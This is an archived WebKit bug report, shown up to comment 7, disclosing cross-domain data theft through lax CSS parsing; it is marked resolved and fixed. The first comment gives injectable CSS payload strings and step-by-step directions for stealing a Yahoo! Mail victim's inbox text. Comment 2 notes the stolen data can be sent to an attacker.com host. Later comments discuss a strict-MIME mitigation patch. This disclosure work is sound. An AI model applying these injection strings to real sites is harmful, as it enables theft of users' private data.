<!DOCTYPE html>
<html lang="en">
  <head>
    <title>29820 &ndash; Lax CSS parsing leads to limited cross-domain theft for a subset of sites</title>

      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<link href="data/assets/52436921e68ed468d372628fc792a752.css?1591398800" rel="stylesheet" type="text/css">

<link href="data/assets/3173de5410adb6e3827752fbd2bfd7b4.css?1591398794" rel="stylesheet" type="text/css">

    
<script type="text/javascript" src="data/assets/a7c2f3a028f17a9aa60f56dc9d6e732d.js?1591398800"></script>

    <script type="text/javascript">
    <!--
        YAHOO.namespace('bugzilla');
        YAHOO.util.Event.addListener = function (el, sType, fn, obj, overrideContext) {
               if ( ("onpagehide" in window || YAHOO.env.ua.gecko) && sType === "unload") { sType = "pagehide"; };
               var capture = ((sType == "focusin" || sType == "focusout") && !YAHOO.env.ua.ie) ? true : false;
               return this._addListener(el, this._getType(sType), fn, obj, overrideContext, capture);
         };
        if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
            YAHOO.util.Event._simpleRemove(window, "unload", 
                                           YAHOO.util.Event._unload);
        }
        
        function unhide_language_selector() { 
            YAHOO.util.Dom.removeClass(
                'lang_links_container', 'bz_default_hidden'
            ); 
        } 
        YAHOO.util.Event.onDOMReady(unhide_language_selector);

        
        var BUGZILLA = {
            param: {
                cookiepath: '\/',
                maxusermatches: 1000
            },
            constant: {
                COMMENT_COLS: 80
            },
            string: {
                

                attach_desc_required:
                    "You must enter a Description for this attachment.",
                component_required:
                    "You must select a Component for this bug.",
                description_required:
                    "You must enter a Description for this bug.",
                short_desc_required:
                    "You must enter a Summary for this bug.",
                version_required:
                    "You must select a Version for this bug."
            }
              , api_token: ''
        };

    if (history && history.replaceState) {
      if(!document.location.href.match(/show_bug\.cgi/)) {
        history.replaceState( null,
                             "29820 – Lax CSS parsing leads to limited cross-domain theft for a subset of sites",
                             "show_bug.cgi?id=29820" );
        document.title = "29820 – Lax CSS parsing leads to limited cross-domain theft for a subset of sites";
      }
      if (document.location.href.match(/show_bug\.cgi\?.*list_id=/)) {
        var href = document.location.href;
        href = href.replace(/[\?&]+list_id=(\d+|cookie)/, '');
        history.replaceState(null, "29820 – Lax CSS parsing leads to limited cross-domain theft for a subset of sites", href);
      }
    }
    YAHOO.util.Event.onDOMReady(function() {
      initDirtyFieldTracking();

    });
    // -->
    </script>
<script type="text/javascript" src="data/assets/daf5e0fb6826e6a35280e622913f0c4a.js?1591398800"></script>


    


    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla" href="./search_plugin.cgi">
    <link rel="shortcut icon" href="images/favicon.ico">
  </head>

  <body 
        class="bugs-webkit-org
                 bz_bug
                 bz_status_RESOLVED
                 bz_product_Security
                 bz_component_Security
                 bz_bug_29820 yui-skin-sam">


  <div id="header">

    


    <div id="titles">

      <span id="title"> WebKit Bugzilla</span>



    </div>



        <div id="bug_title">Bug&nbsp;29820: Lax CSS parsing leads to limited cross-domain theft for a subset of sites</div>


    <div id="common_links"><ul class="links">
  <li><a href="./">Home</a></li>
  <li><span class="separator">| </span><a href="enter_bug.cgi">New</a></li>
  <li><span class="separator">| </span><a href="describecomponents.cgi">Browse</a></li>
  <li><span class="separator">| </span><a href="query.cgi">Search</a></li>

  <li class="form">
    <span class="separator">| </span>
    <form action="buglist.cgi" method="get"
        onsubmit="if (this.quicksearch.value == '')
                  { alert('Please enter one or more search terms first.');
                    return false; } return true;">
    <input type="hidden" id="no_redirect_top" name="no_redirect" value="0">
    <script type="text/javascript">
      if (history && history.replaceState) {
        var no_redirect = document.getElementById("no_redirect_top");
        no_redirect.value = 1;
      }
    </script>
    <input class="txt" type="text" id="quicksearch_top" name="quicksearch" 
           title="Quick Search" value="">
    <input class="btn" type="submit" value="Search" 
           id="find_top"></form>
  <a href="page.cgi?id=quicksearch.html" title="Quicksearch Help">[?]</a></li>

  <li><span class="separator">| </span><a href="report.cgi">Reports</a></li>

  <li>
      <span class="separator">| </span>
        <a href="request.cgi">Requests</a></li>


  <li>
        <span class="separator">| </span>
        <a href="https://bugzilla.readthedocs.org/en/5.0/using/understanding.html" target="_blank">Help</a>
      </li>
    
      <li id="new_account_container_top">
        <span class="separator">| </span>
        <a href="createaccount.cgi">New&nbsp;Account</a>
      </li>

    <li id="mini_login_container_top">
  <span class="separator">| </span>
  <a id="login_link_top" href="show_bug.cgi?id=29820&amp;GoAheadAndLogIn=1"
     onclick="return show_mini_login_form('_top')">Log In</a>

  <form action="show_bug.cgi?id=29820" method="POST"
        class="mini_login bz_default_hidden"
        id="mini_login_top">
    <input id="Bugzilla_login_top" required
           name="Bugzilla_login" class="bz_login"
        type="email" placeholder="Email Address">
    <input class="bz_password" name="Bugzilla_password" type="password"
           id="Bugzilla_password_top" required
           placeholder="Password">
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
            id="log_in_top">
    <a href="#" onclick="return hide_mini_login_form('_top')">[x]</a>
  </form>
</li>


  <li id="forgot_container_top">
    <span class="separator">| </span>
    <a id="forgot_link_top" href="show_bug.cgi?id=29820&amp;GoAheadAndLogIn=1#forgot"
       onclick="return show_forgot_form('_top')">Forgot Password</a>
    <form action="token.cgi" method="post" id="forgot_form_top"
          class="mini_forgot bz_default_hidden">
      <label for="login_top">Login:</label>
      <input name="loginname" size="20" id="login_top" required
          type="email" placeholder="Your Email Address">
      <input id="forgot_button_top" value="Reset Password" type="submit">
      <input type="hidden" name="a" value="reqpw">
      <input type="hidden" id="token_top" name="token"
             value="1635620813-yEQfQ8DcbK5Gl4x8ATqRYcmSIc0SOPK23SDU2MwRGOc">
      <a href="#" onclick="return hide_forgot_form('_top')">[x]</a>
    </form>
  </li>
</ul>
    </div>
  </div>


  <div id="bugzilla-body">


<script type="text/javascript">
<!--

//-->
</script>

<form name="changeform" id="changeform" method="post" action="process_bug.cgi">

  <input type="hidden" name="delta_ts" value="2012-05-10 08:16:12">
  <input type="hidden" name="id" value="29820">
  <input type="hidden" name="token" value="1635620813-613b3_T_YfWUHU1W-l-JS-TEVx3sYm5GOKnvNfAg9Y8">
<div class="bz_short_desc_container edit_form">
     <a href="show_bug.cgi?id=29820"><b>Bug&nbsp;29820</b></a> <span id="summary_container" class="bz_default_hidden">
      - <span id="short_desc_nonedit_display">Lax CSS parsing leads to limited cross-domain theft for a subset of sites</span>
     </span>

    <div id="summary_input"><span class="field_label "
    id="field_label_short_desc">


  <a 
      title="The bug summary is a short sentence which succinctly describes what the bug is about."
      class="field_help_link"
      href="page.cgi?id=fields.html#short_desc"
  >Summary:</a>

</span>Lax CSS parsing leads to limited cross-domain theft for a subset of sites
    </div>
  </div>
  <script type="text/javascript">
    hideEditableField('summary_container',
                      'summary_input',
                      'summary_edit_action',
                      'short_desc',
                      'Lax CSS parsing leads to limited cross-domain theft for a subset of sites' );
  </script>

  <table id="bug_details" class="edit_form">

    <tr>
      
      <td id="bz_show_bug_column_1" class="bz_show_bug_column">     
        <table>
          <tr>
    <th class="field_label">
      <a href="page.cgi?id=fields.html#bug_status">Status</a>:
    </th>
    <td id="bz_field_status">
      <span id="static_bug_status">RESOLVED
          FIXED
      </span>
    </td>
  </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr><th class="field_label "
    id="field_label_alias">


  <a 
      title="A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla."
      class="field_help_link"
      href="page.cgi?id=fields.html#alias"
  >Alias:</a>

</th>
    <td>
        None
    </td>
  </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr><th class="field_label "
    id="field_label_product">


  <a 
      title="Bugs are categorised into Products and Components."
      class="field_help_link"
      href="describecomponents.cgi"
  >Product:</a>

</th>
  <td class="field_value "
      id="field_container_product" >Security

</td>
    </tr>

    
    <tr class="bz_default_hidden"><th class="field_label "
    id="field_label_classification">


  <a 
      title="Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation."
      class="field_help_link"
      href="page.cgi?id=fields.html#classification"
  >Classification:</a>

</th>
  <td class="field_value "
      id="field_container_classification" >Unclassified

</td>
    </tr>
        
    
    
    <tr><th class="field_label "
    id="field_label_component">


  <a 
      title="Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list."
      class="field_help_link"
      href="describecomponents.cgi?product=Security"
  >Component:</a>

</th>
  <td class="field_value "
      id="field_container_component" >Security

  (<a href="buglist.cgi?component=Security&amp;product=Security&amp;bug_status=__open__"
      target="_blank">show other bugs</a>)
</td>
    </tr>
    <tr>
<th class="field_label "
    id="field_label_version">


  <a 
      title="The version field defines the version of the software the bug was found in."
      class="field_help_link"
      href="page.cgi?id=fields.html#version"
  >Version:</a>

</th>
<td>Other
  </td>

    </tr>
        
    
        
    <tr><th class="field_label "
    id="field_label_rep_platform">


  <a 
      title="The hardware platform the bug was observed on. Note: When searching, selecting the option &quot;All&quot; only finds bugs whose value for this field is literally the word &quot;All&quot;."
      class="field_help_link"
      href="page.cgi?id=fields.html#rep_platform"
  >Hardware:</a>

</th>
      <td class="field_value">PC
        All
      </td>
    </tr>
          <tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
          
          <tr>
      <th class="field_label">
        <label  accesskey="i">
          <a href="page.cgi?id=fields.html#importance"><u>I</u>mportance</a></label>:
      </th>
      <td>P2

       Normal

      </td>
    </tr>
          
          <tr><th class="field_label "
    id="field_label_assigned_to">


  <a 
      title="The person in charge of resolving the bug."
      class="field_help_link"
      href="page.cgi?id=fields.html#assigned_to"
  >Assignee:</a>

</th>
      <td><span class="vcard"><span class="fn">WebKit Security Group</span>
</span>
      </td>
    </tr>


    <script type="text/javascript">
      assignToDefaultOnChange(['product'],
        'webkit-security-unassigned\x40lists.webkit.org',
        '');
    </script>
          <tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
          <tr><th class="field_label "
    id="field_label_bug_file_loc">


  <a 
      title="Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen."
      class="field_help_link"
      href="page.cgi?id=fields.html#bug_file_loc"
  >URL:</a>

</th>
    <td>
      <span id="bz_url_input_area">
      </span>
    </td>
  </tr>


    <tr><th class="field_label "
    id="field_label_keywords">


  <a 
      title="You can add keywords from a defined list to bugs, in order to easily identify and group them."
      class="field_help_link"
      href="describekeywords.cgi"
  >Keywords:</a>

</th>
  <td class="field_value "
      id="field_container_keywords" >InRadar

</td>
    </tr>
          <tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>

          
<tr><th class="field_label "
    id="field_label_dependson">


  <a 
      title="The bugs listed here must be resolved before this bug can be resolved."
      class="field_help_link"
      href="page.cgi?id=fields.html#dependson"
  >Depends on:</a>

</th>

  <td>
    <span id="dependson_input_area">
    </span>

  </td>
  </tr>
  
  <tr><th class="field_label "
    id="field_label_blocked">


  <a 
      title="This bug must be resolved before the bugs listed in this field can be resolved."
      class="field_help_link"
      href="page.cgi?id=fields.html#blocked"
  >Blocks:</a>

</th>

  <td>
    <span id="blocked_input_area">
    </span>
<a class="bz_bug_link 
          bz_status_RESOLVED  bz_closed"
   title="RESOLVED INVALID - LayoutTests/http/tests/security/cross-origin-css.html results differ between DumpRenderTree and Safari"
   href="show_bug.cgi?id=35032">35032</a> 
  </td>
  </tr>

    <tr>
      <th>&nbsp;</th>

      <td id="show_dependency_tree_or_graph">
        Show dependency <a href="showdependencytree.cgi?id=29820&amp;hide_resolved=1">tree</a>

          /&nbsp;<a href="showdependencygraph.cgi?id=29820">graph</a>
      </td>
    </tr>
          
        </table>
      </td>
      <td>
        <div class="bz_column_spacer">&nbsp;</div>
      </td>
      
      <td id="bz_show_bug_column_2" class="bz_show_bug_column">
        <table>
        <tr>
    <th class="field_label">
      Reported:
    </th>
    <td>2009-09-28 11:40 PDT by <span class="vcard"><span class="fn">Chris Evans</span>
</span>
    </td>
  </tr>
  
  <tr>
    <th class="field_label">
      Modified:
    </th>
    <td>2012-05-10 08:16 PDT
      (<a href="show_activity.cgi?id=29820">History</a>)
    </td>
  
  </tr>
<tr>
      <th class="field_label">
        <label  accesskey="a">
          CC List:
        </label>
      </th>
      <td>11 
          users
          <span id="cc_edit_area_showhide_container" class="bz_default_hidden">
            (<a href="#" id="cc_edit_area_showhide">show</a>)
          </span>
        <div id="cc_edit_area">
          <br>
            <select id="cc" multiple="multiple" size="5" >
                <option value="abarth">abarth</option>
                <option value="ap">ap</option>
                <option value="cevans">cevans</option>
                <option value="ddkilzer">ddkilzer</option>
                <option value="hyatt">hyatt</option>
                <option value="mihnea">mihnea</option>
                <option value="mitz">mitz</option>
                <option value="mjs">mjs</option>
                <option value="sam">sam</option>
                <option value="vdanen">vdanen</option>
                <option value="yong.li.webkit">yong.li.webkit</option>
            </select>
        </div>
          <script type="text/javascript">
            hideEditableField( 'cc_edit_area_showhide_container', 
                               'cc_edit_area', 
                               'cc_edit_area_showhide', 
                               '', 
                               '');  
          </script>
      </td>
    </tr>

<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr><th class="field_label "
    id="field_label_see_also">


  <a 
      title="This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields."
      class="field_help_link"
      href="page.cgi?id=fields.html#see_also"
  >See Also:</a>

</th>
  <td class="field_value "
      id="field_container_see_also" >

</td>
    </tr> 

<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>



        </table>
      </td>
    </tr>
    <tr>
      <td colspan="3">
          <hr id="bz_top_half_spacer">
      </td>
    </tr>
  </table>

  <table id="bz_big_form_parts">
  <tr>
  <td>

    
<script src="js/status-bubble.js?1584556449"></script>
<script type="text/javascript">
<!--
window.addEventListener('message', handleStatusBubbleMessage, false);

function toggle_display(link) {
    var table = document.getElementById("attachment_table");
    var view_all = document.getElementById("view_all");
    var hide_obsolete_url_parameter = "&hide_obsolete=1";
    // Store current height for scrolling later
    var originalHeight = table.offsetHeight;
    var rows = YAHOO.util.Dom.getElementsByClassName(
        'bz_tr_obsolete', 'tr', table);

    for (var i = 0; i < rows.length; i++) {
        bz_toggleClass(rows[i], 'bz_default_hidden');
    }

    if (YAHOO.util.Dom.hasClass(rows[0], 'bz_default_hidden')) {
        link.innerHTML = "Show Obsolete";
        view_all.href = view_all.href + hide_obsolete_url_parameter 
    }
    else {
        link.innerHTML = "Hide Obsolete";
        view_all.href = view_all.href.replace(hide_obsolete_url_parameter,"");
    }

    var newHeight = table.offsetHeight;
    // This scrolling makes the window appear to not move at all.
    window.scrollBy(0, newHeight - originalHeight);

    return false;
}
//-->
</script>

<br>
<table id="attachment_table">
  <tr id="a0">
    <th colspan="3" class="left">
      Attachments
    </th>
  </tr>


      <tr id="a1" class="bz_contenttype_text_plain bz_patch bz_tr_obsolete bz_default_hidden"


      >
        <td>
            <a href="attachment.cgi?id=42540"
               title="View the content of the attachment">
          <b><span class="bz_obsolete">Patch and test</span></b></a>

          <span class="bz_attach_extra_info">
              (18.01 KB,
                patch)

            <br>
            <a href="#attach_42540"
               title="Go to the comment associated with the attachment">2009-11-04 20:39 PST</a>,

            <span class="vcard"><span class="fn">Chris Evans</span>
</span>
          </span>
        </td>

          <td class="bz_attach_flags">
                  <span title="Dave Hyatt">hyatt</span>:
                review-
                <br>
          </td>

        <td>


          <a href="attachment.cgi?id=42540&amp;action=edit">Details</a>

            | <a href="attachment.cgi?id=42540&amp;action=prettypatch">Formatted Diff</a>

            | <a href="attachment.cgi?id=42540&amp;action=diff">Diff</a>

          <div class="statusBubble">
            <iframe src="https://ews.webkit.org/status-bubble/42540/"
                    style="width: 0px; height: 20px; border: none;" scrolling="no" onload="handleStatusBubbleLoad(this)">
            </iframe>
          </div>

        </td>
      </tr>
      <tr id="a2" class="bz_contenttype_text_plain bz_patch"
 style="background-color: rgb(255,255,200);" 

      >
        <td>
            <a href="attachment.cgi?id=43007"
               title="View the content of the attachment">
          <b>Address all comments from review</b></a>

          <span class="bz_attach_extra_info">
              (21.64 KB,
                patch)

            <br>
            <a href="#attach_43007"
               title="Go to the comment associated with the attachment">2009-11-11 14:39 PST</a>,

            <span class="vcard"><span class="fn">Chris Evans</span>
</span>
          </span>
        </td>

          <td class="bz_attach_flags">
                  <span title="Dave Hyatt">hyatt</span>:
                review-
                <br>
          </td>

        <td>


          <a href="attachment.cgi?id=43007&amp;action=edit">Details</a>

            | <a href="attachment.cgi?id=43007&amp;action=prettypatch">Formatted Diff</a>

            | <a href="attachment.cgi?id=43007&amp;action=diff">Diff</a>

          <div class="statusBubble">
            <iframe src="https://ews.webkit.org/status-bubble/43007/"
                    style="width: 0px; height: 20px; border: none;" scrolling="no" onload="handleStatusBubbleLoad(this)">
            </iframe>
          </div>

        </td>
      </tr>
      <tr id="a3" class="bz_contenttype_text_plain bz_patch"
 style="background-color: rgb(255,255,200);" 

      >
        <td>
            <a href="attachment.cgi?id=44830"
               title="View the content of the attachment">
          <b>Latest patch -- merge with WebKit head</b></a>

          <span class="bz_attach_extra_info">
              (21.16 KB,
                patch)

            <br>
            <a href="#attach_44830"
               title="Go to the comment associated with the attachment">2009-12-14 18:02 PST</a>,

            <span class="vcard"><span class="fn">Chris Evans</span>
</span>
          </span>
        </td>

          <td class="bz_attach_flags">
                  <span title="Adam Barth">abarth</span>:
                review+
                <br>
          </td>

        <td>


          <a href="attachment.cgi?id=44830&amp;action=edit">Details</a>

            | <a href="attachment.cgi?id=44830&amp;action=prettypatch">Formatted Diff</a>

            | <a href="attachment.cgi?id=44830&amp;action=diff">Diff</a>

          <div class="statusBubble">
            <iframe src="https://ews.webkit.org/status-bubble/44830/"
                    style="width: 0px; height: 20px; border: none;" scrolling="no" onload="handleStatusBubbleLoad(this)">
            </iframe>
          </div>

        </td>
      </tr>

  <tr class="bz_attach_footer">
    <td colspan="3">
        <span class="bz_attach_view_hide">
            <a href="#a0" onclick="return toggle_display(this);">Show
              Obsolete</a> (1)
            <a id="view_all" href="attachment.cgi?bugid=29820&amp;action=viewall&amp;hide_obsolete=1">View All</a>
        </span>
        <a href="attachment.cgi?bugid=29820&amp;action=enter">Add an attachment</a>
        (proposed patch, testcase, etc.)
    </td>
  </tr>
</table>
<br>
<div id="add_comment" class="bz_section_additional_comments">
      <table>
        <tr>
          <td>
            <fieldset>
              <legend>Note</legend>
              You need to
              <a href="show_bug.cgi?id=29820&amp;GoAheadAndLogIn=1">log in</a>
              before you can comment on or make changes to this bug.
            </fieldset>
          </td>
        </tr> 
      </table>
  </div>
  </td>
  <td>
  </td>
  </tr></table>

  
  <div id="comments"><script src="js/comments.js?1490751600" type="text/javascript">
</script>

<script type="text/javascript">
<!--
  /* Adds the reply text to the 'comment' textarea */
  function replyToComment(id, real_id, name) {
      var prefix = "(In reply to " + name + " from comment #" + id + ")\n";
      var replytext = "";
        /* pre id="comment_name_N" */
        var text_elem = document.getElementById('comment_text_'+id);
        var text = getText(text_elem);
        replytext = prefix + wrapReplyText(text);


      /* <textarea id="comment"> */
      var textarea = document.getElementById('comment');
      if (textarea.value != replytext) {
          textarea.value += replytext;
      }

      textarea.focus();
  } 
//-->
</script>


<!-- This auto-sizes the comments and positions the collapse/expand links 
     to the right. -->
<table class="bz_comment_table">
<tr>
<td>
<div id="c0" class="bz_comment bz_first_comment">

      <div class="bz_first_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c0">Description</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-09-28 11:40:00 PDT
        </span>

      </div>




<pre class="bz_comment_text">[Apologies for not filing this sooner. I thought I had filed it, but it seems not. I've been sat on this for too long. Since this affects all browsers equally, I was going to just discuss it on my blog and let the web community figure out the best way to address this. However, I thought it would be polite to offer WebKit / Safari a chance to fix it first].

The attack involves cross-domain CSS stylesheet loading. Because the CSS
parser is very lax, it will skip over any amount of preceding and following
junk, in its quest to find a valid selector. Here is an example of a valid
selector:

body { background-image: url('<a href="http://www.evil.com/blah">http://www.evil.com/blah</a>'); }

If a construct like this can be forced to appear anywhere in a cross-domain document, then cross-domain theft may be possible. The attacker can introduce this construct into a page by injecting two strings:

1) {}body{background-image:url('<a href="http://google.com/">http://google.com/</a>
(Note that the seemingly redundant {} is to resync
the CSS parser to make sure the evil descriptor parses properly. Further note that having the url start like a valid url is required to steal the text in some browsers).

2) ');}

Any anything between those two strings will then be cross-domain stealable! The data is stolen cross domain with e.g.
window.getComputedStyle(body_element, null).getPropertyValue('background-image');
(This works in most browsers; for IE, you use ele.currentStyle.backgroundImage)

There are a surprising number of places in internet sites where an attacker
can do this. It can apply to HTML, XML, JSON, XHTML, etc.

At this point, an example is probably useful. To set up for this example, you need:
a) Get a Yahoo! Mail account.
b) Make sure you are logged into it.
c) E-mail the target victim Yahoo! account with the subject
');}
d) Wait a bit, so that some sensitive e-mails fill the inbox. (Or just simulate one).
e) E-mail the target victim Yahoo! account with the subject
{}body{background-image:url('<a href="http://google.com/">http://google.com/</a>
f) Send victim to theft page <a href="https://cevans-app.appspot.com/static/yahoocss.html">https://cevans-app.appspot.com/static/yahoocss.html</a>
g) The stolen text shown is achieved via cross-domain CSS theft.

Other good examples I've had success with are social networking sites, where the attacker gets to leave arbitrary-text comments which are rendered on the victim's trusted page.

The main common construct that prevents exploitation is newlines.
Obviously, newlines cannot be considered a defense! Escaping or encoding of quote characters can also interfere with exploitation. One useful trick: if ' is escaped, use &quot; to enclose the CSS string.

Part 2 (on possible solutions) to follow.</pre>
    </div>

    <div id="c1" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c1">Comment 1</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">David Kilzer (:ddkilzer)</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-09-28 11:43:25 PDT
        </span>

      </div>




<pre class="bz_comment_text">&lt;<a href="rdar://problem/7258451">rdar://problem/7258451</a>&gt;</pre>
    </div>

    <div id="c2" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c2">Comment 2</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-09-28 11:54:52 PDT
        </span>

      </div>




<pre class="bz_comment_text">Possible solutions.

First, there are some solutions it is easy to reject:

1) Restrict read of CSS text if it came from a different domain.
This is a useful defense that I filed a while ago in a different bug. But it
will not help in this case. The attacker can simply use
<a href="http://www.attacker.com/">http://www.attacker.com/</a> as a prefix for the background-image value, and wait
for the HTTP GET to arrive which includes the stolen text in the payload.

2) Do not send cookies for cross-domain CSS loads.
This probably breaks a load of sites? It is certainly a riskier approach. I
have not dared try it!


The solution that I'm playing with is as follows:

- Activate &quot;strict MIME type required&quot; in the event that the CSS was loaded
(via link tag or &#64;import) as a cross-domain resource.

- Also, crash hard if a CSS load fails due to strict MIME type test failure.

I've been running my build locally with these changes for a few days and there
seems to be some merit in this approach, i.e. my browser hasn't crashed apart
from when I hit my attack URLs.

I see that WebKit has a history of defaulting to &quot;strict MIME type required&quot;
for _all_ CSS loads, and that historically broke some sites like dell.com and
was reverted.
Perhaps the web at large now has its MIME types in order well enough to at
least enforce strict for cross-domain CSS loads? If too much breaks, we have
the additional level we can introduce of trying to parse the cross-domain CSS
but bailing on first syntax error. I'd like to avoid a test that is going that
deep into nuance, however.</pre>
    </div>

    <div id="c3" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c3">Comment 3</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-09-28 12:06:09 PDT
        </span>

      </div>




<pre class="bz_comment_text">Here's the patch I'm running with. Including 3rd chunk which crashes on mismatched MIME type when strict mode is on... (note -- not adding as an attachment because it most certainly is not a proposed patch :P )

Index: html/HTMLLinkElement.cpp
===================================================================
--- html/HTMLLinkElement.cpp    (revision 48734)
+++ html/HTMLLinkElement.cpp    (working copy)
&#64;&#64; -252,6 +252,12 &#64;&#64;
     if (enforceMIMEType &amp;&amp; document()-&gt;page() &amp;&amp; !document()-&gt;page()-&gt;settings()-&gt;enforceCSSMIMETypeInStrictMode())
         enforceMIMEType = false;
 
+    // If we're loading a stylesheet cross-domain, always enforce a stricter
+    // MIME type check. This prevents an attacker playing games by injecting
+    // CSS strings into HTML, XML, JSON, etc. etc.
+    if (!document()-&gt;securityOrigin()-&gt;canRequest(KURL(ParsedURLString, url)))
+        enforceMIMEType = true;
+
     m_sheet-&gt;parseString(sheet-&gt;sheetText(enforceMIMEType), strictParsing);
     m_sheet-&gt;setTitle(title());
 
Index: css/CSSImportRule.cpp
===================================================================
--- css/CSSImportRule.cpp       (revision 48734)
+++ css/CSSImportRule.cpp       (working copy)
&#64;&#64; -26,6 +26,7 &#64;&#64;
 #include &quot;DocLoader.h&quot;
 #include &quot;Document.h&quot;
 #include &quot;MediaList.h&quot;
+#include &quot;SecurityOrigin.h&quot;
 #include &quot;Settings.h&quot;
 #include &lt;wtf/StdLibExtras.h&gt;
 
&#64;&#64; -62,7 +63,10 &#64;&#64;
 
     CSSStyleSheet* parent = parentStyleSheet();
     bool strict = !parent || parent-&gt;useStrictParsing();
-    String sheetText = sheet-&gt;sheetText(strict);
+    bool enforceMIMEType = strict;
+    if (!parent || !parent-&gt;doc() || !parent-&gt;doc()-&gt;securityOrigin()-&gt;canRequest(KURL(ParsedURLString, url)))
+        enforceMIMEType = true;
+    String sheetText = sheet-&gt;sheetText(enforceMIMEType);
     m_styleSheet-&gt;parseString(sheetText, strict);
 
     if (strict &amp;&amp; parent &amp;&amp; parent-&gt;doc() &amp;&amp; parent-&gt;doc()-&gt;settings() &amp;&amp; parent-&gt;doc()-&gt;settings()-&gt;needsSiteSpecificQuirks()) {
Index: loader/CachedCSSStyleSheet.cpp
===================================================================
--- loader/CachedCSSStyleSheet.cpp      (revision 48734)
+++ loader/CachedCSSStyleSheet.cpp      (working copy)
&#64;&#64; -138,7 +138,9 &#64;&#64;
     // This code defaults to allowing the stylesheet for non-HTTP protocols so
     // folks can use standards mode for local HTML documents.
     String mimeType = extractMIMETypeFromMediaType(response().httpHeaderField(&quot;Content-Type&quot;));
-    return mimeType.isEmpty() || equalIgnoringCase(mimeType, &quot;text/css&quot;) || equalIgnoringCase(mimeType, &quot;application/x-unknown-content-type&quot;);
+    if (!(mimeType.isEmpty() || equalIgnoringCase(mimeType, &quot;text/css&quot;) || equalIgnoringCase(mimeType, &quot;application/x-unknown-content-type&quot;)))
+        *((char*)NULL) = '\0';
+    return true;
 }
  
 }</pre>
    </div>

    <div id="c4" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c4">Comment 4</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Maciej Stachowiak</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-09-28 22:23:54 PDT
        </span>

      </div>




<pre class="bz_comment_text">(In reply to <a href="show_bug.cgi?id=29820#c2">comment #2</a>)
&gt;
<span class="quote">&gt; 
&gt; I see that WebKit has a history of defaulting to &quot;strict MIME type required&quot;
&gt; for _all_ CSS loads, and that historically broke some sites like dell.com and
&gt; was reverted.
&gt; Perhaps the web at large now has its MIME types in order well enough to at
&gt; least enforce strict for cross-domain CSS loads? If too much breaks, we have
&gt; the additional level we can introduce of trying to parse the cross-domain CSS
&gt; but bailing on first syntax error. I'd like to avoid a test that is going that
&gt; deep into nuance, however.</span >

We could experiment with doing that, but the risk may be somewhat high. The security benefit could be worth it however.</pre>
    </div>

    <div id="c5" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c5">Comment 5</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-09-29 08:23:59 PDT
        </span>

      </div>




<pre class="bz_comment_text">Note that any experimental WebKit change would get an automatic workout in the Chrome dev channel builds fairly quickly ;-)</pre>
    </div>

    <div id="c6" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c6">Comment 6</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Adam Barth</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-09-29 13:19:11 PDT
        </span>

      </div>




<pre class="bz_comment_text">(In reply to <a href="show_bug.cgi?id=29820#c5">comment #5</a>)
<span class="quote">&gt; Note that any experimental WebKit change would get an automatic workout in the
&gt; Chrome dev channel builds fairly quickly ;-)</span >

This is a good opportunity to use UMA to see which of these mitigations are feasible w.r.t. compatibility.</pre>
    </div>

    <div id="c7" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c7">Comment 7</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-09-29 13:40:38 PDT
